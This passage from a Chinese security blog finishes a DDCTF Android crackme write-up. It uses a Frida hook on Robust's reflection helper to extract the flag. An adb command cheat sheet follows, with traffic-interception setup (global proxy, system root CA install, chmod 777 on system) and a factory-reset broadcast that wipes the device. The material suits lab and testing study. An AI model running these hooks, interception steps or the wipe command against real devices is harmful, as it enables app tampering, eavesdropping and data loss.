<p>所以这个时候，我们必须知道onClick真正执行的逻辑是什么。查看MainActivity$1Patch类中的真正的onClick方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package cn.chaitin.geektan.crackme;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.text.Editable;</span><br><span class="line">import android.text.TextUtils;</span><br><span class="line">import android.view.View;</span><br><span class="line">import android.widget.EditText;</span><br><span class="line">import android.widget.Toast;</span><br><span class="line">import cn.chaitin.geektan.crackme.MainActivity;</span><br><span class="line">import com.meituan.robust.patch.RobustModify;</span><br><span class="line">import com.meituan.robust.utils.EnhancedRobustUtils;</span><br><span class="line"></span><br><span class="line">public class MainActivity$1Patch &#123;</span><br><span class="line">    MainActivity.1 originClass;</span><br><span class="line"></span><br><span class="line">    public MainActivity$1Patch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity.1) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object[] getRealParameter(Object[] objArr) &#123;</span><br><span class="line">        if (objArr &#x3D;&#x3D; null || objArr.length &lt; 1) &#123;</span><br><span class="line">            return objArr;</span><br><span class="line">        &#125;</span><br><span class="line">        Object[] objArr2 &#x3D; new Object[objArr.length];</span><br><span class="line">        for (int i &#x3D; 0; i &lt; objArr.length; i++) &#123;</span><br><span class="line">            if (objArr[i] &#x3D;&#x3D; this) &#123;</span><br><span class="line">                objArr2[i] &#x3D; this.originClass;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                objArr2[i] &#x3D; objArr[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return objArr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void onClick(View view) &#123;</span><br><span class="line">        MainActivity$1Patch mainActivity$1Patch;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectStaticMethod(&quot;modify&quot;, RobustModify.class, getRealParameter(new Object[0]), (Class[]) null);</span><br><span class="line">        MainActivity.1 r0 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">        if (r0 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r0 &#x3D; ((MainActivity$1Patch) r0).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!((Boolean) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;isEmpty&quot;, TextUtils.class, getRealParameter(new Object[]&#123;(Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r0, new Object[0], (Class[]) null, EditText.class)&#125;), new Class[]&#123;CharSequence.class&#125;)).booleanValue()) &#123;</span><br><span class="line">            MainActivity.1 r02 &#x3D; (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r02 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r02 &#x3D; ((MainActivity$1Patch) r02).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r03 &#x3D; (Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r02, new Object[0], (Class[]) null, EditText.class);</span><br><span class="line">            if (r03 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r03 &#x3D; ((MainActivity$1Patch) r03).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r04 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r03, new Object[0], (Class[]) null, Object.class);</span><br><span class="line">            MainActivity.1 r1 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectConstruct(&quot;java.lang.StringBuilder&quot;, new Object[0], (Class[]) null);</span><br><span class="line">            if (r1 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r1 &#x3D; ((MainActivity$1Patch) r1).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r12 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r1, getRealParameter(new Object[]&#123;&quot;DDCTF&#123;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r2 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r2 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r2 &#x3D; ((MainActivity$1Patch) r2).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r12 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r12 &#x3D; ((MainActivity$1Patch) r12).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r13 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r12, getRealParameter(new Object[]&#123;str&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            MainActivity.1 r22 &#x3D; (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class);</span><br><span class="line">            if (r22 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r22 &#x3D; ((MainActivity$1Patch) r22).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str2 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r22, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">            if (r13 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r13 &#x3D; ((MainActivity$1Patch) r13).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r14 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r13, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r14 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r14 &#x3D; ((MainActivity$1Patch) r14).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.1 r15 &#x3D; (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r14, getRealParameter(new Object[]&#123;&quot;&#125;&quot;&#125;), new Class[]&#123;String.class&#125;, StringBuilder.class);</span><br><span class="line">            if (r15 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r15 &#x3D; ((MainActivity$1Patch) r15).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            String str3 &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r15, new Object[0], (Class[]) null, StringBuilder.class);</span><br><span class="line">            if (r04 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                r04 &#x3D; ((MainActivity$1Patch) r04).originClass;</span><br><span class="line">            &#125;</span><br><span class="line">            if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, r04, getRealParameter(new Object[]&#123;str3&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;</span><br><span class="line">                if (this instanceof MainActivity$1Patch) &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this.originClass;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    mainActivity$1Patch &#x3D; this;</span><br><span class="line">                &#125;</span><br><span class="line">                MainActivity.1 r05 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, mainActivity$1Patch, MainActivity.1.class), &quot;恭喜大佬！密码正确！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">                if (r05 &#x3D;&#x3D; this) &#123;</span><br><span class="line">                    r05 &#x3D; ((MainActivity$1Patch) r05).originClass;</span><br><span class="line">                &#125;</span><br><span class="line">                EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r05, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.1 r06 &#x3D; (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]&#123;(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class), &quot;大佬莫急！再试试！&quot;, new Integer(0)&#125;), new Class[]&#123;Context.class, CharSequence.class, Integer.TYPE&#125;);</span><br><span class="line">        if (r06 &#x3D;&#x3D; this) &#123;</span><br><span class="line">            r06 &#x3D; ((MainActivity$1Patch) r06).originClass;</span><br><span class="line">        &#125;</span><br><span class="line">        EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r06, new Object[0], (Class[]) null, Toast.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析onClick方法，可以发现很多<code>invokeReflectStaticMethod</code>，<code>getFieldValue</code>，<code>invokeReflectMethod</code>方法，同样我们还能发现flag就在这里面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;flag是通过append将字符串以及Joseph（int,int）的返回值拼接构成的。</span><br><span class="line">String str &#x3D; &quot;DDCTF&#123;&quot;;</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(5), new Integer(6)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]&#123;new Integer(7), new Integer(8)&#125;), new Class[]&#123;Integer.TYPE, Integer.TYPE&#125;, MainActivity.class);</span><br><span class="line">str &#x3D; &quot;&#125;&quot;;</span><br><span class="line">&#x2F;&#x2F;最终将我们输入的值与上面构造的equals比较，判断是否准确。</span><br><span class="line">if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, obj, getRealParameter(new Object[]&#123;str2&#125;), new Class[]&#123;Object.class&#125;, String.class)).booleanValue()) &#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面的分析，可以发现hook有2个思路：</p>
<p>1.hook <code>EnhancedRobustUtils</code>类下的方法获取方法执行的返回值。<br>2.hook 动态加载的类<code>MainActivityPatch</code>的<code>Joseph</code>方法，直接调用它获取返回值。（下篇）</p>
<h2 id="代码构造"><a href="#代码构造" class="headerlink" title="代码构造"></a>代码构造</h2><p>先来看看EnhancedRobustUtils类下的方法<code>invokeReflectMethod</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static Object invokeReflectMethod(String methodName, Object targetObject, Object[] parameters, Class[] args, Class declaringClass) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;可以看到这里是通过反射的方法拿到类实例</span><br><span class="line">            Method method &#x3D; getDeclaredMethod(targetObject, methodName, args, declaringClass);</span><br><span class="line">            &#x2F;&#x2F;代入参数，调用方法</span><br><span class="line">            return method.invoke(targetObject, parameters);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;invokeReflectMethod error &quot; + methodName + &quot;   parameter   &quot; + parameters + &quot; targetObject &quot; + targetObject.toString() + &quot;  args  &quot; + args);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>invokeReflectConstruct</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static Object invokeReflectConstruct(String className, Object[] parameter, Class[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;通过Class.forName(className)反射得到一个Class对象</span><br><span class="line">            Class clazz &#x3D; Class.forName(className);</span><br><span class="line">            &#x2F;&#x2F;获得构造器</span><br><span class="line">            Constructor constructor &#x3D; clazz.getDeclaredConstructor(args);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            &#x2F;&#x2F;返回该类的实例</span><br><span class="line">            return constructor.newInstance(parameter);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        if (isThrowable) &#123;</span><br><span class="line">            throw new RuntimeException(&quot;invokeReflectConstruct error &quot; + className + &quot;   parameter   &quot; + parameter);</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>很简单，通过反射得到类的实例及方法，最终通过invoke代入参数执行方法。这里很幸运，我们发现这个EnhancedRobustUtils 是Robust自带的类，并不是动态加载的。<br>那hook就非常简单了，我们只需要简单的hook <code>invokeReflectMethod</code>获取Joseph的返回值，以及equals的参数即可。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105192047314.png" alt="image-20210105192047314"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">&#x2F;&#x2F;获得EnhancedRobustUtils类的wapper</span><br><span class="line">        var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">&#x2F;&#x2F;hook invokeReflectMethod方法</span><br><span class="line">        robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">        &#x2F;&#x2F;不破坏原来的逻辑，只在原来的逻辑中打印出Joseph，equals的值</span><br><span class="line">            var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">            if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">                console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">                console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">                console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">                console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">                send(v4);</span><br><span class="line">                console.log(&quot;return:&quot;+result);</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>完整代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import frida,sys</span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">		var robust &#x3D; Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);</span><br><span class="line">		robust.invokeReflectMethod.implementation &#x3D; function(v1,v2,v3,v4,v5)&#123;</span><br><span class="line">			var result &#x3D; this.invokeReflectMethod(v1,v2,v3,v4,v5);</span><br><span class="line">			if(v1&#x3D;&#x3D;&quot;Joseph&quot;)&#123;</span><br><span class="line">				console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">				console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">				console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">				send(v4);</span><br><span class="line">				console.log(&quot;return:&quot;+result);</span><br><span class="line">				console.log(&quot;-----------------------------------------------------&quot;)</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			else if(v1&#x3D;&#x3D;&quot;equals&quot;)&#123;</span><br><span class="line">				console.log(&quot;functionName:&quot;+v1);</span><br><span class="line">				console.log(&quot;functionArg3:&quot;+v3);</span><br><span class="line">				console.log(&quot;functionArg4:&quot;+v4);</span><br><span class="line">				send(v4);</span><br><span class="line">				console.log(&quot;return:&quot;+result);</span><br><span class="line">			&#125;</span><br><span class="line">			return result;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">session &#x3D; frida.get_usb_device().attach(&quot;cn.chaitin.geektan.crackme&quot;)</span><br><span class="line">script &#x3D; session.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;,on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>运行脚本 点击Onclick</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105200059163.png" alt="image-20210105200059163"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-229597.htm">https://bbs.pediy.com/thread-229597.htm</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Frida</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>adb使用总结</title>
    <url>/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="adb使用"><a href="#adb使用" class="headerlink" title="adb使用"></a>adb使用</h1><a id="more"></a>

<h2 id="adb连接"><a href="#adb连接" class="headerlink" title="adb连接"></a>adb连接</h2><pre><code>adb connect ip:5555
adb devices
adb -s device-id shell  //指定某个设备(插充电设备或USB网络时)
// 查看网络状态
adb shell netstat

// 通过 tcp/ip 连接，默认端口 5555
adb connect host:port

// 转发套接字连接
adb forward local remote</code></pre><h2 id="adb-截图发送到当前用户目录下"><a href="#adb-截图发送到当前用户目录下" class="headerlink" title="adb 截图发送到当前用户目录下"></a>adb 截图发送到当前用户目录下</h2><pre><code>adb exec-out screencap -p &gt; 1.png</code></pre><h2 id="adb文件导出-导入"><a href="#adb文件导出-导入" class="headerlink" title="adb文件导出/导入"></a>adb文件导出/导入</h2><h3 id="从电脑上复制文件到设备"><a href="#从电脑上复制文件到设备" class="headerlink" title="从电脑上复制文件到设备"></a>从电脑上复制文件到设备</h3><pre><code>// 把 a.png 从电脑上拷贝到设备sd卡上
adb push ~/a.png /mnt/sdcard/

// 把 a.png 从电脑上拷贝到设备sd卡上并重命名为 b.png
adb push ~/a.png /mnt/sdcard/b.png</code></pre><p>​    </p>
<pre><code>// 把 pic目录下所有文件从电脑上拷贝到设备sd卡上
adb push ~/pic/ /mnt/sdcard/</code></pre><h3 id="从设备复制文件到电脑"><a href="#从设备复制文件到电脑" class="headerlink" title="从设备复制文件到电脑"></a>从设备复制文件到电脑</h3><pre><code>// 把 a.png 从设备sd卡上拷贝到电脑上
adb pull /mnt/sdcard/a.png ~/

// 把 a.png 从设备sd卡上拷贝到电脑上并命名为b.png
adb pull /mnt/sdcard/a.png ~/b.png

// 把pics目录下所有文件从设备sd卡上拷贝到电脑上
adb pull /mnt/sdcard/pics/ ~/pics/</code></pre><p>​    </p>
<h3 id="一些基本命令"><a href="#一些基本命令" class="headerlink" title="一些基本命令"></a>一些基本命令</h3><pre><code>// 列出sd卡根目录下所有文件
adb shell ls /sdcard/

// 定位到 /sdcard/目录
adb shell cd /sdcard/

// 删除某文件
// -f 强制删除文件不需要确认
// -r 递归删除文件夹内文件
// -i 删除文件前需要确认
adb shell rm /sdcard/1.txt

// 创建目录
adb shell mkdir /sdcard/temp/
// 指定 -p 递归创建目录
adb shell mkdir -p  /sdcard/temp/test/abc/hello/

// 创建文件
adb shell touch /sdcard/1.txt

// 显示当前所在目录
adb shell pwd

// 拷贝文件1.txt到test目录
adb shell cp /sdcard/1.txt /sdcard/test/

// 移动文件，移动同一目录下文件相当于重命名文件
adb shell mv /sdcard/1.txt /sdcard/2.text</code></pre><h2 id="adb修改手机代理"><a href="#adb修改手机代理" class="headerlink" title="adb修改手机代理"></a>adb修改手机代理</h2><h3 id="全局代理"><a href="#全局代理" class="headerlink" title="全局代理"></a>全局代理</h3><pre><code>设置代理：
adb shell settings put global http_proxy 代理IP地址:端口号
如：
adb shell settings put global http_proxy 192.168.137.97:8888

移除代理：
adb shell settings delete global http_proxy
adb shell settings delete global global_http_proxy_host
adb shell settings delete global global_http_proxy_port</code></pre><h3 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h3><blockquote>
<p>手机获取Root权限后，直接把Base64文本格式的根证书文件复制到etc/security/cacerts文件夹里，然后到设置(Settings) – 安全(Security) – 受信任的凭据(Trusted credentials)里面，此时你要安装的根证书应该会显示已经安装好了。这样安装之后根证书是作为系统证书使用的，而不是按照方法一安装方式的用户证书。</p>
</blockquote>
<p>.cer（非.crt）格式文件</p>
<p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a. openssl x509 -inform DER -subject_hash_old -in CA_Name.cer    | head -1</span><br><span class="line">得到类似字符串：9a5ba575</span><br><span class="line">b.cat CA_Name.cer  &gt; 9a5ba575.0</span><br><span class="line">c.openssl x509 -inform DER -text -in CA_Name.cer    -out &#x2F;dev&#x2F;null &gt;&gt; 9a5ba575.0</span><br><span class="line">d.放入&#x2F;system&#x2F;ca-certificates&#x2F;files&#x2F;</span><br><span class="line">实际测试，可能会报错，报错后不管格式，DER 换成PEM 试试</span><br><span class="line">编译到：&#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;</span><br><span class="line">e:烧录重启验证</span><br></pre></td></tr></table></figure>


<p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p>
<p>Fiddler默认是cer证书，如何转为pem呢？指令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform der -in abc.cer -out out.pem</span><br></pre></td></tr></table></figure>

<p><a href="https://segmentfault.com/a/1190000017035564">https://segmentfault.com/a/1190000017035564</a><br>解决只读文件无法写入的问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb remount</span><br><span class="line">adb shell</span><br><span class="line">chmod 777 system</span><br></pre></td></tr></table></figure>

<h3 id="第三方apk"><a href="#第三方apk" class="headerlink" title="第三方apk"></a>第三方apk</h3><p>AndroidProxySetter工具可以帮助我们使用adb命令可以快速进行wifi代理的设置和清除<br>GitHub地址：<a href="https://github.com/jpkrause/AndroidProxySetter">https://github.com/jpkrause/AndroidProxySetter</a></p>
<p>下好apk后，安装到手机</p>
<pre><code>adb install proxy-setter-debug-0.2.1.apk</code></pre><p>设置代理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell am start -n tk.elevenk.proxysetter&#x2F;.MainActivity -e host 代理IP地址 -e port 端口号 -e ssid WIFI名称 -e reset-wifi true -e key WIFI密码</span><br></pre></td></tr></table></figure>

<p>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell am start -n tk.elevenk.proxysetter&#x2F;.MainActivity -e host 127.0.0.1 -e port 8888 -e ssid YOUR-WIFI-NAME -e reset-wifi true -e key YOUR-WIFI-PASSWORD</span><br></pre></td></tr></table></figure>



<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><pre><code>// 列出进程列表 ，其中包含进程的 pid 等信息
adb shell ps

// 杀死指定pid的进程
adb shell kill pid

// 查看指定进程信息
adb shell ps -x pid </code></pre><h2 id="apk管理"><a href="#apk管理" class="headerlink" title="apk管理"></a>apk管理</h2><h3 id="adb导出（手机apk到电脑）"><a href="#adb导出（手机apk到电脑）" class="headerlink" title="adb导出（手机apk到电脑）"></a>adb导出（手机apk到电脑）</h3><pre><code>1、adb shell pm list package
打印出来所有安装到手机上的APP包名
adb shell pm list package com.huawei.   //查找包含com.huawei的包

2、adb shell pm path com.xxx.xxx
找出安装后的包名应用的apk所在位置

3、adb pull path_apk  out_apk
path_apk为apk在手机上的目录，即2中的apk在手机中的目录，out_apk为导出apk的目标路径。

4、通过adb命令查看Android手机已安装应用的版本号versionCode和versionName
adb shell dumpsys package  [PackageName] | findstr versionCode
adb shell dumpsys package  [PackageName] | findstr versionName</code></pre><h2 id="日志输出"><a href="#日志输出" class="headerlink" title="日志输出"></a>日志输出</h2><pre><code>// 查看指定 tag 日志
adb logcat -s tag

// 清除log缓存
adb logcat -c</code></pre><h2 id="启动activity"><a href="#启动activity" class="headerlink" title="启动activity"></a>启动activity</h2><pre><code>// 启动应用
// -n 指定包名/包名+启动类的类名 ，启动类的类名必须是完整路径
adb shell am start -n package/package-activity

// 停止应用
adb shell am force-stop package

// 启动 service
adb shell am startservice [options] &lt;INTENT&gt;
举例：adb shell am startservice -a com.lt.test.action.ONESERVICE
举例：adb shell am startservice -n com.lt.test/.MyService

// 发送广播
adb shell am broadcast [options] &lt;INTENT&gt;
// 发送一个广播去关闭一个activity
adb shell am broadcast -a &quot;action_finish&quot; 
// 恢复出厂设置的方法，会清除内存所有内容
adb shell am broadcast -a android.intent.action.MASTER_CLEAR
adb shell am broadcast -n com.lt.test/.MyBroadcast

// 列举出所有包含&lt;INTENT&gt;的package
adb shell pm list packages [options] &lt;INTENT&gt;
adb shell pm list packages com.lt</code></pre><h2 id="管理安装包"><a href="#管理安装包" class="headerlink" title="管理安装包"></a>管理安装包</h2><pre><code>adb shell pm
安装应用程序
adb install xxx.apk

// 覆盖安装(保留缓存和数据)
adb install -r xxx.apk

// 安装apk到sd卡
adb install -s xxx.apk

卸载应用程序
adb uninstall package

// 卸载时保留数据和缓存目录
adb uninstall -k package</code></pre><p>​    </p>
<pre><code>列出设备上的所有权限
adb shell pm list permissions

列出设备上安装的所有app的包名
adb shell pm list packages

// 列出指定包名对应的apk路径
adb shell pm path com.android.search

// 清空指定包名对应的应用的数据和缓存文件，开发时很有用
adb shell pm clear com.android.search</code></pre><p>​    </p>
<pre><code>列出设备上的所有feature
adb shell pm list features</code></pre><h2 id="adb安装证书"><a href="#adb安装证书" class="headerlink" title="adb安装证书"></a>adb安装证书</h2><p>adb shell am start -n com.android.certinstaller/.CertInstallerMain -a android.intent.action.VIEW -t application/x-x509-ca-cert file:///sdcard/cacert.cer</p>
<p>参考：<a href="https://www.jianshu.com/p/f547b05a5335">https://www.jianshu.com/p/f547b05a5335</a></p>
<h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h2><pre><code>// 获取系统属性，可以获取到一大堆关于系统信息（键值对形式）
adb shell getprop 

// 获取系统属性并过滤出包含version的信息
adb shell getprop | grep version</code></pre><p>​    </p>
<pre><code>查看 cpu 和 内存使用情况
// 每隔一秒会刷新一次 cpu 和 内存情况
adb shell top

// 查看占用内存前3的应用
adb shell top -m 3

// 刷新3次内存信息（不指定-n参数的话默认每秒会刷新1次数据）：
adb shell top -n 3

// 查看占用内存前3的应用，刷新1次
adb shell top -m 3 -n 1</code></pre><p>​    </p>
<pre><code>查看系统当前 cpu 使用情况
adb shell cat /proc/cpuinfo
adb shell cat /proc/stat

查看系统当前内存使用情况
adb shell cat /proc/meminfo

查看指定包名应用内存使用情况，各项信息具体说明
adb shell dumpsys meminfo package</code></pre><p>​    </p>
<pre><code>查看 service
adb shell service list
adb shell cat /system/build.prop

电池相关
// 查看电量管理信息，其中可以知道当前那个应用持有WAKE_LOCK锁
adb shell dumpsys power

// 查看电池用量情况
adb shell dumpsys battery

// 查看电池使用日志
adb shell dumpsys batterystats
图形界面日志分析参考google提供的工具 https://github.com/google/battery-historian</code></pre><h2 id="查看当前activity"><a href="#查看当前activity" class="headerlink" title="查看当前activity"></a>查看当前activity</h2><pre><code>logcat | grep ActivityManager
adb shell dumpsys activity activities
adb shell dumpsys activity activities | findstr &quot;应用包名&quot; 

过滤字符串忽略大小写 : adb logcat | grep -i wifi ;

过滤固定字符串 : 只要命令行出现的日志都可以过滤, 不管是不是标签;

-- 命令 : adb logcat | grep Wifi ;</code></pre><h1 id="APP安全测试"><a href="#APP安全测试" class="headerlink" title="APP安全测试"></a>APP安全测试</h1><h2 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h2><h3 id="activity-是否可以被ddos"><a href="#activity-是否可以被ddos" class="headerlink" title="activity 是否可以被ddos"></a>activity 是否可以被ddos</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell am start -S -n 包名&#x2F;Activity名</span><br></pre></td></tr></table></figure>



